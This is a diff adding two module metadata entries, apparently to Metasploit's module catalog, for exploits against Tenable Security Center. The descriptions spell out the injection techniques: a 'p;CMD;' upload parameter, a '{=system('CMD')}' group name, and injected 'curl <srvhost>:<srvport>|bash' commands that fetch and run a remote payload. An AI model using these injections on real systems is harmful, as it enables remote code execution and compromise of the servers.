@@ -89047,6 +89047,124 @@
     "session_types": false,
     "needs_cleanup": null
   },
+  "exploit_linux/http/tenable_sc_auditfile_cmdinject_cve_2026_19681": {
+    "name": "Tenable Security Center SCAP Audit File Command Injection",
+    "fullname": "exploit/linux/http/tenable_sc_auditfile_cmdinject_cve_2026_19681",
+    "aliases": [],
+    "rank": 600,
+    "disclosure_date": "2026-08-13",
+    "type": "exploit",
+    "author": [
+      "h00die"
+    ],
+    "description": "Tenable Security Center prior to 6.9.0 allows an authenticated user to\n          achieve command execution as the web service account (tns) via the SCAP\n          audit file upload flow.\n\n          Filesystem::saveTmp() builds staged upload filenames from the raw\n          client-supplied `context` form parameter (tempnam prefix), which is not\n          charset-validated. Referencing that staged file in a\n          POST /rest/auditFile (type=scapLinux, version=1.2) request reaches\n          AuditFileLib::addSCAPTailoringFile(), where the zip repack command\n          interpolates the derived path unescaped:\n\n          exec(\"{$CommandZIP} -9Tj $tmpZipFile $newTailoringFilenameEsc\");\n\n          basename() strips '/' but not shell metacharacters, so a context like\n          `p;CMD;` executes CMD through /bin/sh.\n\n          Constraints (measured on 6.7.2): the staged-name prefix survives only\n          ~50 characters of context and may not contain '/' (saveTmp() applies\n          basename()). This module therefore serves the payload over HTTP and\n          injects only `curl${IFS}<srvhost>:<srvport>|bash` (a bare host:port\n          GETs / and bash reads the served script from stdin). The served script\n          itself has no such limits, which the Linux Dropper target exploits\n          with a fetch payload (cmd/linux/http/...) that downloads and execs a\n          full native payload (e.g. x64 meterpreter) from the payload adapter's\n          own listener on FETCH_SRVPORT.\n\n          Tested against SecurityCenter 6.7.2-14 on RHEL9.",
+    "references": [
+      "CVE-2026-19681",
+      "URL-https://www.tenable.com/security/tns-2026-22"
+    ],
+    "platform": "Linux,Unix",
+    "arch": "cmd",
+    "rport": 443,
+    "autofilter_ports": [
+      80,
+      8080,
+      443,
+      8000,
+      8888,
+      8880,
+      8008,
+      3000,
+      8443
+    ],
+    "autofilter_services": [
+      "http",
+      "https"
+    ],
+    "targets": [
+      "Unix Command",
+      "Linux Dropper"
+    ],
+    "mod_time": "2026-08-24 14:35:43 +0000",
+    "path": "/modules/exploits/linux/http/tenable_sc_auditfile_cmdinject_cve_2026_19681.rb",
+    "is_install_path": true,
+    "ref_name": "linux/http/tenable_sc_auditfile_cmdinject_cve_2026_19681",
+    "check": true,
+    "post_auth": true,
+    "default_credential": false,
+    "notes": {
+      "Stability": [
+        "crash-safe"
+      ],
+      "Reliability": [
+        "repeatable-session"
+      ],
+      "SideEffects": [
+        "artifacts-on-disk",
+        "ioc-in-logs"
+      ]
+    },
+    "session_types": false,
+    "needs_cleanup": null
+  },
+  "exploit_linux/http/tenable_sc_report_charting_rce_cve_2026_19626": {
+    "name": "Tenable Security Center Report Charting RCE",
+    "fullname": "exploit/linux/http/tenable_sc_report_charting_rce_cve_2026_19626",
+    "aliases": [],
+    "rank": 600,
+    "disclosure_date": "2026-08-13",
+    "type": "exploit",
+    "author": [
+      "h00die"
+    ],
+    "description": "Tenable Security Center prior to 6.9.0 allows an authenticated,\n          non-administrative user to achieve code execution as the web service\n          account (tns) through report generation.\n\n          A report definition's inline style is discarded at render (components\n          rehydrate styles from the Style tables by styleID), so the payload is\n          delivered through a label instead: a group created with the name\n          `{=system('CMD')}` is accepted verbatim and becomes a pie sector\n          label via a user/sumgroup query; `{label}` substitution runs BEFORE\n          the eval loop, so the payload lands inside the format string and\n          fires at chart render. Regular org users can create both; report\n          launch refuses ROLE_ADMIN - this bug class is explicitly non-admin.\n\n          Payload constraints: the {=...} regex is non-greedy to the first\n          closing brace, so the expression may not contain one, and PHP string\n          interpolation applies; this module therefore injects only\n          `curl <srvhost>:<srvport>|bash`\n          (a bare host:port GETs / and bash reads the served script from\n          stdin). The served script itself has no such limits, which the\n          Linux Dropper target exploits with a fetch payload\n          (cmd/linux/http/...) that downloads and execs a full native payload\n          (e.g. x64 meterpreter) from the payload adapter's own listener on\n          FETCH_SRVPORT.\n\n          Report definitions are closed to administrators (creation returns\n          error 163); supply credentials for a regular org user.\n\n          Tested against SecurityCenter 6.7.2-14 on RHEL9.",
+    "references": [
+      "URL-https://www.tenable.com/security/tns-2026-22",
+      "CVE-2026-19626"
+    ],
+    "platform": "Linux,Unix",
+    "arch": "cmd",
+    "rport": 443,
+    "autofilter_ports": [
+      80,
+      8080,
+      443,
+      8000,
+      8888,
+      8880,
+      8008,
+      3000,
+      8443
+    ],
+    "autofilter_services": [
+      "http",
+      "https"
+    ],
+    "targets": [
+      "Unix Command",
+      "Linux Dropper"
+    ],
+    "mod_time": "2026-08-25 09:35:26 +0000",
+    "path": "/modules/exploits/linux/http/tenable_sc_report_charting_rce_cve_2026_19626.rb",
+    "is_install_path": true,
+    "ref_name": "linux/http/tenable_sc_report_charting_rce_cve_2026_19626",
+    "check": true,
+    "post_auth": true,
+    "default_credential": false,
+    "notes": {
+      "Stability": [
+        "crash-safe"
+      ],
+      "Reliability": [
+        "repeatable-session"
+      ],
+      "SideEffects": [
+        "artifacts-on-disk",
+        "ioc-in-logs"
+      ]
+    },
+    "session_types": false,
+    "needs_cleanup": null
+  },
   "exploit_linux/http/terramaster_unauth_rce_cve_2020_35665": {
     "name": "TerraMaster TOS 4.2.06 or lower - Unauthenticated Remote Code Execution",
     "fullname": "exploit/linux/http/terramaster_unauth_rce_cve_2020_35665",
